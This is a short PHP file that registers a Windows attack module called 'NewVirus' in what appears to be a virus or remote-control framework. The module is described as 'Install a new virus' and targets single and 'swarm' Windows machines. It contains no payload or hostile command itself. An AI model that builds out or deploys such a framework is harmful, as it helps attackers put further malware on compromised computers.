<?php

use Kelvinho\Virus\Attack\Classes;
use Kelvinho\Virus\Attack\PackageRegistrar;

PackageRegistrar::register("win.oneTime.NewVirus", "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\NewVirus", "easy.NewVirus", __DIR__, [Classes::WINDOWS_ALONE, Classes::WINDOWS_SWARM], "Install a new virus");